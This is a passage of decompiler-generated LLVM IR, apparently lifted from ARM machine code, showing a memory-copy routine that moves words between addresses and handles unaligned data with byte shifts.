  %v8_17434 = zext i8 %v7_17434 to i32
  store i32 %v8_17434, i32* @r3, align 4
  %v10_17434 = add i32 %v5_17434, 1
  store i32 %v10_17434, i32* @r1, align 4
  %v8_17438 = inttoptr i32 %v7_17438 to i8*
  store i8 %v7_17434, i8* %v8_17438, align 1
  %v9_17438 = load i32, i32* @r0, align 4
  %v10_17438 = add i32 %v9_17438, 1
  store i32 %v10_17438, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_1756c77 = phi i32 [ %v10_17438, %bb146 ], [ %v7_17438, %.thread127 ]
  %v0_1743c = load i32, i32* %r2.global-to-local, align 4
  %v1_1743c = load i32, i32* @ip, align 4
  %v2_1743c = sub i32 %v0_1743c, %v1_1743c
  store i32 %v2_1743c, i32* %r2.global-to-local, align 4
  %v4_1743c = xor i32 %v1_1743c, %v0_1743c
  %v5_1743c = xor i32 %v2_1743c, %v0_1743c
  %v6_1743c = and i32 %v5_1743c, %v4_1743c
  %v7_1743c = icmp slt i32 %v6_1743c, 0
  store i1 %v7_1743c, i1* %cpsr_v.global-to-local, align 1
  %v8_1743c = icmp slt i32 %v2_1743c, 0
  store i1 %v8_1743c, i1* %cpsr_n.global-to-local, align 1
  %v9_1743c = icmp eq i32 %v0_1743c, %v1_1743c
  store i1 %v9_1743c, i1* %cpsr_z.global-to-local, align 1
  %v2_17440 = xor i1 %v8_1743c, %v7_1743c
  br i1 %v2_17440, label %bb140, label %dec_label_pc_17444

dec_label_pc_17444:                               ; preds = %.thread128
  %v0_17444 = load i32, i32* @r1, align 4
  %v1_17444 = urem i32 %v0_17444, 4
  store i32 %v1_17444, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17444 = icmp eq i32 %v1_17444, 0
  store i1 %v2_17444, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_17444 to i2
  br i1 %v2_17444, label %dec_label_pc_17378, label %dec_label_pc_1744c

dec_label_pc_1744c:                               ; preds = %dec_label_pc_17370, %dec_label_pc_17444
  %v0_1756c76 = phi i32 [ %v1_17350, %dec_label_pc_17370 ], [ %v0_1756c77, %dec_label_pc_17444 ]
  %v0_174d4 = phi i32 [ %v2_17360, %dec_label_pc_17370 ], [ %v2_1743c, %dec_label_pc_17444 ]
  %v0_17454.off0 = phi i2 [ %extract.t, %dec_label_pc_17370 ], [ %extract.t131, %dec_label_pc_17444 ]
  %v0_1744c = phi i32 [ %v0_17350, %dec_label_pc_17370 ], [ %v0_17444, %dec_label_pc_17444 ]
  %v1_1744c = and i32 %v0_1744c, -4
  store i32 %v1_1744c, i32* %r1.global-to-local, align 4
  %v1_17450 = inttoptr i32 %v1_1744c to i32*
  %v2_17450 = load i32, i32* %v1_17450, align 4
  store i32 %v2_17450, i32* %lr.global-to-local, align 4
  %v4_17450 = add i32 %v1_1744c, 4
  store i32 %v4_17450, i32* %r1.global-to-local, align 4
  %v1_174cc = add i32 %v0_174d4, -12
  %v3_174cc = sub i32 11, %v0_174d4
  %v4_174cc = and i32 %v3_174cc, %v0_174d4
  %v5_174cc = icmp slt i32 %v4_174cc, 0
  store i1 %v5_174cc, i1* %cpsr_v.global-to-local, align 1
  %v6_174cc = icmp slt i32 %v1_174cc, 0
  store i1 %v6_174cc, i1* %cpsr_n.global-to-local, align 1
  %v7_174cc = icmp eq i32 %v0_174d4, 12
  store i1 %v7_174cc, i1* %cpsr_z.global-to-local, align 1
  %v2_174d0 = xor i1 %v6_174cc, %v5_174cc
  switch i2 %v0_17454.off0, label %dec_label_pc_17460 [
    i2 -1, label %dec_label_pc_17538
    i2 -2, label %dec_label_pc_174cc
  ]

dec_label_pc_17460:                               ; preds = %dec_label_pc_1744c
  br i1 %v2_174d0, label %dec_label_pc_174ac, label %dec_label_pc_17468

dec_label_pc_17468:                               ; preds = %dec_label_pc_17460
  store i32 %v1_174cc, i32* %r2.global-to-local, align 4
  %v3_1746c = load i32, i32* @r4, align 4
  store i32 %v3_1746c, i32* %stack_var_-16, align 4
  %v6_1746c = load i32, i32* @r5, align 4
  store i32 %v6_1746c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17470

dec_label_pc_17470:                               ; preds = %dec_label_pc_17470.dec_label_pc_17470_crit_edge, %dec_label_pc_17468
  %v0_17494 = phi i32 [ %v12_17494, %dec_label_pc_17470.dec_label_pc_17470_crit_edge ], [ %v0_1756c76, %dec_label_pc_17468 ]
  %v0_17474 = phi i32 [ %v0_17474.pre, %dec_label_pc_17470.dec_label_pc_17470_crit_edge ], [ %v4_17450, %dec_label_pc_17468 ]
  %v0_17470 = phi i32 [ %v0_17470.pre, %dec_label_pc_17470.dec_label_pc_17470_crit_edge ], [ %v2_17450, %dec_label_pc_17468 ]
  %v3_17470 = udiv i32 %v0_17470, 256
  %v1_17474 = inttoptr i32 %v0_17474 to i32*
  %v2_17474 = load i32, i32* %v1_17474, align 4
  store i32 %v2_17474, i32* %r4.global-to-local, align 4
  %v3_17474 = add i32 %v0_17474, 4
  %v4_17474 = inttoptr i32 %v3_17474 to i32*
  %v5_17474 = load i32, i32* %v4_17474, align 4
  store i32 %v5_17474, i32* %r5.global-to-local, align 4
  %v6_17474 = add i32 %v0_17474, 8
  %v7_17474 = inttoptr i32 %v6_17474 to i32*
  %v8_17474 = load i32, i32* %v7_17474, align 4
  store i32 %v8_17474, i32* %ip.global-to-local, align 4
  %v9_17474 = add i32 %v0_17474, 12
  %v10_17474 = inttoptr i32 %v9_17474 to i32*
  %v11_17474 = load i32, i32* %v10_17474, align 4
  store i32 %v11_17474, i32* %lr.global-to-local, align 4
  %v12_17474 = add i32 %v0_17474, 16
  store i32 %v12_17474, i32* %r1.global-to-local, align 4
  %v4_17478 = mul i32 %v2_17474, 16777216
  %v5_17478 = or i32 %v4_17478, %v3_17470
  store i32 %v5_17478, i32* @r3, align 4
  %v3_1747c = udiv i32 %v2_17474, 256
  %v4_17480 = mul i32 %v5_17474, 16777216
  %v5_17480 = or i32 %v4_17480, %v3_1747c
  store i32 %v5_17480, i32* %r4.global-to-local, align 4
  %v3_17484 = udiv i32 %v5_17474, 256
  %v4_17488 = mul i32 %v8_17474, 16777216
  %v5_17488 = or i32 %v4_17488, %v3_17484
  store i32 %v5_17488, i32* %r5.global-to-local, align 4
  %v3_1748c = udiv i32 %v8_17474, 256
  %v4_17490 = mul i32 %v11_17474, 16777216
  %v5_17490 = or i32 %v4_17490, %v3_1748c
  store i32 %v5_17490, i32* @ip, align 4
  %v1_17494 = inttoptr i32 %v0_17494 to i32*
  store i32 %v5_17478, i32* %v1_17494, align 4
  %v3_17494 = add i32 %v0_17494, 4
  %v4_17494 = inttoptr i32 %v3_17494 to i32*
  %v5_17494 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17494, i32* %v4_17494, align 4
  %v6_17494 = add i32 %v0_17494, 8
  %v7_17494 = inttoptr i32 %v6_17494 to i32*
  %v8_17494 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17494, i32* %v7_17494, align 4
  %v9_17494 = add i32 %v0_17494, 12
  %v10_17494 = inttoptr i32 %v9_17494 to i32*
  %v11_17494 = load i32, i32* @ip, align 4
  store i32 %v11_17494, i32* %v10_17494, align 4
  %v12_17494 = add i32 %v0_17494, 16
  store i32 %v12_17494, i32* @r0, align 4
  %v0_17498 = load i32, i32* %r2.global-to-local, align 4
  %v1_17498 = add i32 %v0_17498, -16
  store i32 %v1_17498, i32* %r2.global-to-local, align 4
  %v3_17498 = sub i32 15, %v0_17498
  %v4_17498 = and i32 %v3_17498, %v0_17498
  %v5_17498 = icmp slt i32 %v4_17498, 0
  %v6_17498 = icmp slt i32 %v1_17498, 0
  %v2_1749c = xor i1 %v6_17498, %v5_17498
  br i1 %v2_1749c, label %dec_label_pc_174a0, label %dec_label_pc_17470.dec_label_pc_17470_crit_edge

dec_label_pc_17470.dec_label_pc_17470_crit_edge:  ; preds = %dec_label_pc_17470
  %v0_17470.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_17474.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17470

dec_label_pc_174a0:                               ; preds = %dec_label_pc_17470
  %v2_174a0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_174a0, i32* @r4, align 4
  %v5_174a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_174a0, i32* @r5, align 4
  %v1_174a4 = add i32 %v0_17498, -4
  store i32 %v1_174a4, i32* %r2.global-to-local, align 4
  %v3_174a4 = add i32 %v0_17498, 2147483632
  %v4_174a4 = and i32 %v1_174a4, %v3_174a4
  %v5_174a4 = icmp slt i32 %v4_174a4, 0
  store i1 %v5_174a4, i1* %cpsr_v.global-to-local, align 1
  %v6_174a4 = icmp slt i32 %v1_174a4, 0
  store i1 %v6_174a4, i1* %cpsr_n.global-to-local, align 1
  %v7_174a4 = icmp eq i32 %v1_174a4, 0
  store i1 %v7_174a4, i1* %cpsr_z.global-to-local, align 1
  %v2_174a8 = xor i1 %v6_174a4, %v5_174a4
  br i1 %v2_174a8, label %dec_label_pc_174c4, label %dec_label_pc_174ac

dec_label_pc_174ac:                               ; preds = %dec_label_pc_174a0, %dec_label_pc_17460, %dec_label_pc_174ac
  %v1_174b8 = phi i32 [ %v4_174b8, %dec_label_pc_174ac ], [ %v12_17494, %dec_label_pc_174a0 ], [ %v0_1756c76, %dec_label_pc_17460 ]
  %v0_174ac = load i32, i32* %lr.global-to-local, align 4
  %v3_174ac = udiv i32 %v0_174ac, 256
  store i32 %v3_174ac, i32* %ip.global-to-local, align 4
  %v0_174b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_174b0 = inttoptr i32 %v0_174b0 to i32*
  %v2_174b0 = load i32, i32* %v1_174b0, align 4
  store i32 %v2_174b0, i32* %lr.global-to-local, align 4
  %v4_174b0 = add i32 %v0_174b0, 4
  store i32 %v4_174b0, i32* %r1.global-to-local, align 4
  %v4_174b4 = mul i32 %v2_174b0, 16777216
  %v5_174b4 = or i32 %v4_174b4, %v3_174ac
  store i32 %v5_174b4, i32* @ip, align 4
  %v2_174b8 = inttoptr i32 %v1_174b8 to i32*
  store i32 %v5_174b4, i32* %v2_174b8, align 4
  %v3_174b8 = load i32, i32* @r0, align 4
  %v4_174b8 = add i32 %v3_174b8, 4
  store i32 %v4_174b8, i32* @r0, align 4
  %v0_174bc = load i32, i32* %r2.global-to-local, align 4
  %v1_174bc = add i32 %v0_174bc, -4
  store i32 %v1_174bc, i32* %r2.global-to-local, align 4
  %v3_174bc = sub i32 3, %v0_174bc
  %v4_174bc = and i32 %v3_174bc, %v0_174bc
  %v5_174bc = icmp slt i32 %v4_174bc, 0
  %v6_174bc = icmp slt i32 %v1_174bc, 0
  %v2_174c0 = xor i1 %v6_174bc, %v5_174bc
  br i1 %v2_174c0, label %dec_label_pc_174c4.loopexit, label %dec_label_pc_174ac

dec_label_pc_174c4.loopexit:                      ; preds = %dec_label_pc_174ac
  %v7_174bc = icmp eq i32 %v0_174bc, 4
  store i1 %v5_174bc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_174bc, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_174bc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_174c4

dec_label_pc_174c4:                               ; preds = %dec_label_pc_174c4.loopexit, %dec_label_pc_174a0
  %v0_173ec59 = phi i32 [ %v1_174bc, %dec_label_pc_174c4.loopexit ], [ %v1_174a4, %dec_label_pc_174a0 ]
  %v0_174c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_174c4 = add i32 %v0_174c4, -3
  store i32 %v1_174c4, i32* @r1, align 4
  br label %bb140

dec_label_pc_174cc:                               ; preds = %dec_label_pc_1744c
  br i1 %v2_174d0, label %dec_label_pc_17518, label %dec_label_pc_174d4

dec_label_pc_174d4:                               ; preds = %dec_label_pc_174cc
  store i32 %v1_174cc, i32* %r2.global-to-local, align 4
  %v3_174d8 = load i32, i32* @r4, align 4
  store i32 %v3_174d8, i32* %stack_var_-16, align 4
  %v6_174d8 = load i32, i32* @r5, align 4
  store i32 %v6_174d8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_174dc

dec_label_pc_174dc:                               ; preds = %dec_label_pc_174dc.dec_label_pc_174dc_crit_edge, %dec_label_pc_174d4
  %v0_17500 = phi i32 [ %v12_17500, %dec_label_pc_174dc.dec_label_pc_174dc_crit_edge ], [ %v0_1756c76, %dec_label_pc_174d4 ]
  %v0_174e0 = phi i32 [ %v0_174e0.pre, %dec_label_pc_174dc.dec_label_pc_174dc_crit_edge ], [ %v4_17450, %dec_label_pc_174d4 ]
  %v0_174dc = phi i32 [ %v0_174dc.pre, %dec_label_pc_174dc.dec_label_pc_174dc_crit_edge ], [ %v2_17450, %dec_label_pc_174d4 ]
  %v3_174dc = udiv i32 %v0_174dc, 65536
  %v1_174e0 = inttoptr i32 %v0_174e0 to i32*
  %v2_174e0 = load i32, i32* %v1_174e0, align 4
  store i32 %v2_174e0, i32* %r4.global-to-local, align 4
  %v3_174e0 = add i32 %v0_174e0, 4
  %v4_174e0 = inttoptr i32 %v3_174e0 to i32*
  %v5_174e0 = load i32, i32* %v4_174e0, align 4
  store i32 %v5_174e0, i32* %r5.global-to-local, align 4
  %v6_174e0 = add i32 %v0_174e0, 8
  %v7_174e0 = inttoptr i32 %v6_174e0 to i32*
  %v8_174e0 = load i32, i32* %v7_174e0, align 4
  store i32 %v8_174e0, i32* %ip.global-to-local, align 4
  %v9_174e0 = add i32 %v0_174e0, 12
  %v10_174e0 = inttoptr i32 %v9_174e0 to i32*
  %v11_174e0 = load i32, i32* %v10_174e0, align 4
  store i32 %v11_174e0, i32* %lr.global-to-local, align 4
  %v12_174e0 = add i32 %v0_174e0, 16
  store i32 %v12_174e0, i32* %r1.global-to-local, align 4
  %v4_174e4 = mul i32 %v2_174e0, 65536
  %v5_174e4 = or i32 %v4_174e4, %v3_174dc
  store i32 %v5_174e4, i32* @r3, align 4
  %v3_174e8 = udiv i32 %v2_174e0, 65536
  %v4_174ec = mul i32 %v5_174e0, 65536
  %v5_174ec = or i32 %v4_174ec, %v3_174e8
  store i32 %v5_174ec, i32* %r4.global-to-local, align 4
  %v3_174f0 = udiv i32 %v5_174e0, 65536
  %v4_174f4 = mul i32 %v8_174e0, 65536
  %v5_174f4 = or i32 %v4_174f4, %v3_174f0
  store i32 %v5_174f4, i32* %r5.global-to-local, align 4
  %v3_174f8 = udiv i32 %v8_174e0, 65536
  %v4_174fc = mul i32 %v11_174e0, 65536
  %v5_174fc = or i32 %v4_174fc, %v3_174f8
  store i32 %v5_174fc, i32* @ip, align 4
  %v1_17500 = inttoptr i32 %v0_17500 to i32*
  store i32 %v5_174e4, i32* %v1_17500, align 4
  %v3_17500 = add i32 %v0_17500, 4
  %v4_17500 = inttoptr i32 %v3_17500 to i32*
  %v5_17500 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17500, i32* %v4_17500, align 4
  %v6_17500 = add i32 %v0_17500, 8
  %v7_17500 = inttoptr i32 %v6_17500 to i32*
  %v8_17500 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17500, i32* %v7_17500, align 4
  %v9_17500 = add i32 %v0_17500, 12
  %v10_17500 = inttoptr i32 %v9_17500 to i32*
  %v11_17500 = load i32, i32* @ip, align 4
  store i32 %v11_17500, i32* %v10_17500, align 4
  %v12_17500 = add i32 %v0_17500, 16
  store i32 %v12_17500, i32* @r0, align 4
  %v0_17504 = load i32, i32* %r2.global-to-local, align 4
  %v1_17504 = add i32 %v0_17504, -16
  store i32 %v1_17504, i32* %r2.global-to-local, align 4
  %v3_17504 = sub i32 15, %v0_17504
  %v4_17504 = and i32 %v3_17504, %v0_17504
  %v5_17504 = icmp slt i32 %v4_17504, 0
  %v6_17504 = icmp slt i32 %v1_17504, 0
  %v2_17508 = xor i1 %v6_17504, %v5_17504
  br i1 %v2_17508, label %dec_label_pc_1750c, label %dec_label_pc_174dc.dec_label_pc_174dc_crit_edge

dec_label_pc_174dc.dec_label_pc_174dc_crit_edge:  ; preds = %dec_label_pc_174dc
  %v0_174dc.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_174e0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_174dc

dec_label_pc_1750c:                               ; preds = %dec_label_pc_174dc
  %v2_1750c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1750c, i32* @r4, align 4
  %v5_1750c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1750c, i32* @r5, align 4
  %v1_17510 = add i32 %v0_17504, -4
  store i32 %v1_17510, i32* %r2.global-to-local, align 4
  %v3_17510 = add i32 %v0_17504, 2147483632
  %v4_17510 = and i32 %v1_17510, %v3_17510
  %v5_17510 = icmp slt i32 %v4_17510, 0
  store i1 %v5_17510, i1* %cpsr_v.global-to-local, align 1
  %v6_17510 = icmp slt i32 %v1_17510, 0
  store i1 %v6_17510, i1* %cpsr_n.global-to-local, align 1
  %v7_17510 = icmp eq i32 %v1_17510, 0
  store i1 %v7_17510, i1* %cpsr_z.global-to-local, align 1
  %v2_17514 = xor i1 %v6_17510, %v5_17510
  br i1 %v2_17514, label %dec_label_pc_17530, label %dec_label_pc_17518

dec_label_pc_17518:                               ; preds = %dec_label_pc_1750c, %dec_label_pc_174cc, %dec_label_pc_17518
  %v1_17524 = phi i32 [ %v4_17524, %dec_label_pc_17518 ], [ %v12_17500, %dec_label_pc_1750c ], [ %v0_1756c76, %dec_label_pc_174cc ]
  %v0_17518 = load i32, i32* %lr.global-to-local, align 4
  %v3_17518 = udiv i32 %v0_17518, 65536
  store i32 %v3_17518, i32* %ip.global-to-local, align 4
  %v0_1751c = load i32, i32* %r1.global-to-local, align 4
  %v1_1751c = inttoptr i32 %v0_1751c to i32*
  %v2_1751c = load i32, i32* %v1_1751c, align 4
  store i32 %v2_1751c, i32* %lr.global-to-local, align 4
  %v4_1751c = add i32 %v0_1751c, 4
  store i32 %v4_1751c, i32* %r1.global-to-local, align 4
  %v4_17520 = mul i32 %v2_1751c, 65536
  %v5_17520 = or i32 %v4_17520, %v3_17518
  store i32 %v5_17520, i32* @ip, align 4
  %v2_17524 = inttoptr i32 %v1_17524 to i32*
  store i32 %v5_17520, i32* %v2_17524, align 4
  %v3_17524 = load i32, i32* @r0, align 4
  %v4_17524 = add i32 %v3_17524, 4
  store i32 %v4_17524, i32* @r0, align 4
  %v0_17528 = load i32, i32* %r2.global-to-local, align 4
  %v1_17528 = add i32 %v0_17528, -4
  store i32 %v1_17528, i32* %r2.global-to-local, align 4
  %v3_17528 = sub i32 3, %v0_17528
  %v4_17528 = and i32 %v3_17528, %v0_17528
  %v5_17528 = icmp slt i32 %v4_17528, 0
  %v6_17528 = icmp slt i32 %v1_17528, 0
  %v2_1752c = xor i1 %v6_17528, %v5_17528
  br i1 %v2_1752c, label %dec_label_pc_17530.loopexit, label %dec_label_pc_17518

dec_label_pc_17530.loopexit:                      ; preds = %dec_label_pc_17518
  %v7_17528 = icmp eq i32 %v0_17528, 4
  store i1 %v5_17528, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_17528, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_17528, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17530

dec_label_pc_17530:                               ; preds = %dec_label_pc_17530.loopexit, %dec_label_pc_1750c
  %v0_173ec60 = phi i32 [ %v1_17528, %dec_label_pc_17530.loopexit ], [ %v1_17510, %dec_label_pc_1750c ]
  %v0_17530 = load i32, i32* %r1.global-to-local, align 4
  %v1_17530 = add i32 %v0_17530, -2
  store i32 %v1_17530, i32* @r1, align 4
  br label %bb140

dec_label_pc_17538:                               ; preds = %dec_label_pc_1744c
  br i1 %v2_174d0, label %dec_label_pc_17584, label %dec_label_pc_17540

dec_label_pc_17540:                               ; preds = %dec_label_pc_17538
  store i32 %v1_174cc, i32* %r2.global-to-local, align 4
  %v3_17544 = load i32, i32* @r4, align 4
  store i32 %v3_17544, i32* %stack_var_-16, align 4
  %v6_17544 = load i32, i32* @r5, align 4
  store i32 %v6_17544, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17548

dec_label_pc_17548:                               ; preds = %dec_label_pc_17548.dec_label_pc_17548_crit_edge, %dec_label_pc_17540
  %v0_1756c = phi i32 [ %v12_1756c, %dec_label_pc_17548.dec_label_pc_17548_crit_edge ], [ %v0_1756c76, %dec_label_pc_17540 ]
  %v0_1754c = phi i32 [ %v0_1754c.pre, %dec_label_pc_17548.dec_label_pc_17548_crit_edge ], [ %v4_17450, %dec_label_pc_17540 ]
  %v0_17548 = phi i32 [ %v0_17548.pre, %dec_label_pc_17548.dec_label_pc_17548_crit_edge ], [ %v2_17450, %dec_label_pc_17540 ]
  %v3_17548 = udiv i32 %v0_17548, 16777216
  %v1_1754c = inttoptr i32 %v0_1754c to i32*
  %v2_1754c = load i32, i32* %v1_1754c, align 4
  store i32 %v2_1754c, i32* %r4.global-to-local, align 4
  %v3_1754c = add i32 %v0_1754c, 4
  %v4_1754c = inttoptr i32 %v3_1754c to i32*
  %v5_1754c = load i32, i32* %v4_1754c, align 4
  store i32 %v5_1754c, i32* %r5.global-to-local, align 4
  %v6_1754c = add i32 %v0_1754c, 8
  %v7_1754c = inttoptr i32 %v6_1754c to i32*
  %v8_1754c = load i32, i32* %v7_1754c, align 4
  store i32 %v8_1754c, i32* %ip.global-to-local, align 4
  %v9_1754c = add i32 %v0_1754c, 12
  %v10_1754c = inttoptr i32 %v9_1754c to i32*
  %v11_1754c = load i32, i32* %v10_1754c, align 4
  store i32 %v11_1754c, i32* %lr.global-to-local, align 4
  %v12_1754c = add i32 %v0_1754c, 16
  store i32 %v12_1754c, i32* %r1.global-to-local, align 4
  %v4_17550 = mul i32 %v2_1754c, 256
  %v5_17550 = or i32 %v4_17550, %v3_17548
  store i32 %v5_17550, i32* @r3, align 4
  %v3_17554 = udiv i32 %v2_1754c, 16777216
  %v4_17558 = mul i32 %v5_1754c, 256
  %v5_17558 = or i32 %v4_17558, %v3_17554
  store i32 %v5_17558, i32* %r4.global-to-local, align 4
  %v3_1755c = udiv i32 %v5_1754c, 16777216
  %v4_17560 = mul i32 %v8_1754c, 256
  %v5_17560 = or i32 %v4_17560, %v3_1755c
  store i32 %v5_17560, i32* %r5.global-to-local, align 4
  %v3_17564 = udiv i32 %v8_1754c, 16777216
  %v4_17568 = mul i32 %v11_1754c, 256
  %v5_17568 = or i32 %v4_17568, %v3_17564
  store i32 %v5_17568, i32* @ip, align 4
  %v1_1756c = inttoptr i32 %v0_1756c to i32*
  store i32 %v5_17550, i32* %v1_1756c, align 4
  %v3_1756c = add i32 %v0_1756c, 4
  %v4_1756c = inttoptr i32 %v3_1756c to i32*
  %v5_1756c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1756c, i32* %v4_1756c, align 4
  %v6_1756c = add i32 %v0_1756c, 8
  %v7_1756c = inttoptr i32 %v6_1756c to i32*
  %v8_1756c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1756c, i32* %v7_1756c, align 4
  %v9_1756c = add i32 %v0_1756c, 12
  %v10_1756c = inttoptr i32 %v9_1756c to i32*
  %v11_1756c = load i32, i32* @ip, align 4
  store i32 %v11_1756c, i32* %v10_1756c, align 4
  %v12_1756c = add i32 %v0_1756c, 16
  store i32 %v12_1756c, i32* @r0, align 4
  %v0_17570 = load i32, i32* %r2.global-to-local, align 4
  %v1_17570 = add i32 %v0_17570, -16
  store i32 %v1_17570, i32* %r2.global-to-local, align 4
  %v3_17570 = sub i32 15, %v0_17570
  %v4_17570 = and i32 %v3_17570, %v0_17570
  %v5_17570 = icmp slt i32 %v4_17570, 0
  %v6_17570 = icmp slt i32 %v1_17570, 0
  %v2_17574 = xor i1 %v6_17570, %v5_17570
  br i1 %v2_17574, label %dec_label_pc_17578, label %dec_label_pc_17548.dec_label_pc_17548_crit_edge

dec_label_pc_17548.dec_label_pc_17548_crit_edge:  ; preds = %dec_label_pc_17548
  %v0_17548.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1754c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17548

dec_label_pc_17578:                               ; preds = %dec_label_pc_17548
  %v2_17578 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17578, i32* @r4, align 4
  %v5_17578 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17578, i32* @r5, align 4
  %v1_1757c = add i32 %v0_17570, -4
  store i32 %v1_1757c, i32* %r2.global-to-local, align 4
  %v3_1757c = add i32 %v0_17570, 2147483632
  %v4_1757c = and i32 %v1_1757c, %v3_1757c
  %v5_1757c = icmp slt i32 %v4_1757c, 0
  store i1 %v5_1757c, i1* %cpsr_v.global-to-local, align 1
  %v6_1757c = icmp slt i32 %v1_1757c, 0
  store i1 %v6_1757c, i1* %cpsr_n.global-to-local, align 1
  %v7_1757c = icmp eq i32 %v1_1757c, 0
  store i1 %v7_1757c, i1* %cpsr_z.global-to-local, align 1
  %v2_17580 = xor i1 %v6_1757c, %v5_1757c
  br i1 %v2_17580, label %dec_label_pc_1759c, label %dec_label_pc_17584

dec_label_pc_17584:                               ; preds = %dec_label_pc_17578, %dec_label_pc_17538, %dec_label_pc_17584
  %v1_17590 = phi i32 [ %v4_17590, %dec_label_pc_17584 ], [ %v12_1756c, %dec_label_pc_17578 ], [ %v0_1756c76, %dec_label_pc_17538 ]
  %v0_17584 = load i32, i32* %lr.global-to-local, align 4
  %v3_17584 = udiv i32 %v0_17584, 16777216
  store i32 %v3_17584, i32* %ip.global-to-local, align 4
  %v0_17588 = load i32, i32* %r1.global-to-local, align 4
  %v1_17588 = inttoptr i32 %v0_17588 to i32*
  %v2_17588 = load i32, i32* %v1_17588, align 4
  store i32 %v2_17588, i32* %lr.global-to-local, align 4
  %v4_17588 = add i32 %v0_17588, 4
  store i32 %v4_17588, i32* %r1.global-to-local, align 4
  %v4_1758c = mul i32 %v2_17588, 256
  %v5_1758c = or i32 %v4_1758c, %v3_17584
  store i32 %v5_1758c, i32* @ip, align 4
  %v2_17590 = inttoptr i32 %v1_17590 to i32*
  store i32 %v5_1758c, i32* %v2_17590, align 4
  %v3_17590 = load i32, i32* @r0, align 4
  %v4_17590 = add i32 %v3_17590, 4
  store i32 %v4_17590, i32* @r0, align 4
  %v0_17594 = load i32, i32* %r2.global-to-local, align 4
  %v1_17594 = add i32 %v0_17594, -4
  store i32 %v1_17594, i32* %r2.global-to-local, align 4
  %v3_17594 = sub i32 3, %v0_17594
  %v4_17594 = and i32 %v3_17594, %v0_17594
  %v5_17594 = icmp slt i32 %v4_17594, 0
  %v6_17594 = icmp slt i32 %v1_17594, 0
  %v2_17598 = xor i1 %v6_17594, %v5_17594
  br i1 %v2_17598, label %dec_label_pc_1759c.loopexit, label %dec_label_pc_17584

dec_label_pc_1759c.loopexit:                      ; preds = %dec_label_pc_17584
  %v7_17594 = icmp eq i32 %v0_17594, 4
  store i1 %v5_17594, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_17594, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_17594, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1759c

dec_label_pc_1759c:                               ; preds = %dec_label_pc_1759c.loopexit, %dec_label_pc_17578
  %v0_173ec61 = phi i32 [ %v1_17594, %dec_label_pc_1759c.loopexit ], [ %v1_1757c, %dec_label_pc_17578 ]
  %v0_1759c = load i32, i32* %r1.global-to-local, align 4
  %v1_1759c = add i32 %v0_1759c, -1
  store i32 %v1_1759c, i32* @r1, align 4
  br label %bb140

dec_label_pc_175a4:                               ; preds = %entry
  %v1_175a4 = load i32, i32* @r2, align 4
  %v2_175a4 = add i32 %v1_175a4, %v0_17350
  store i32 %v2_175a4, i32* %r1.global-to-local, align 4
  %v2_175a8 = add i32 %v1_175a4, %v1_17350
  store i32 %v2_175a8, i32* %r0.global-to-local, align 4
  %v2_175ac = add i32 %v1_175a4, -4
  store i32 %v2_175ac, i32* %r2.global-to-local, align 4
  %v4_175ac = sub i32 3, %v1_175a4
  %v5_175ac = and i32 %v4_175ac, %v1_175a4
  %v6_175ac = icmp slt i32 %v5_175ac, 0
  store i1 %v6_175ac, i1* %cpsr_v.global-to-local, align 1
  %v7_175ac = icmp slt i32 %v2_175ac, 0
  store i1 %v7_175ac, i1* %cpsr_n.global-to-local, align 1
  %v8_175ac = icmp eq i32 %v1_175a4, 4
  store i1 %v8_175ac, i1* %cpsr_z.global-to-local, align 1
  %v5_175b0 = icmp slt i32 %v1_175a4, 4
  br i1 %v5_175b0, label %bb150, label %dec_label_pc_175b4

dec_label_pc_175b4:                               ; preds = %dec_label_pc_175a4
  %v1_175b4 = urem i32 %v2_175a8, 4
  store i32 %v1_175b4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_175b4 = icmp eq i32 %v1_175b4, 0
  store i1 %v2_175b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_175b4, label %dec_label_pc_175bc, label %dec_label_pc_1765c

dec_label_pc_175bc:                               ; preds = %dec_label_pc_175b4
  %v1_175bc = urem i32 %v2_175a4, 4
  store i32 %v1_175bc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_175bc = icmp eq i32 %v1_175bc, 0
  store i1 %v2_175bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_175bc, label %dec_label_pc_175c4, label %dec_label_pc_17688

dec_label_pc_175c4:                               ; preds = %dec_label_pc_175bc, %dec_label_pc_17680
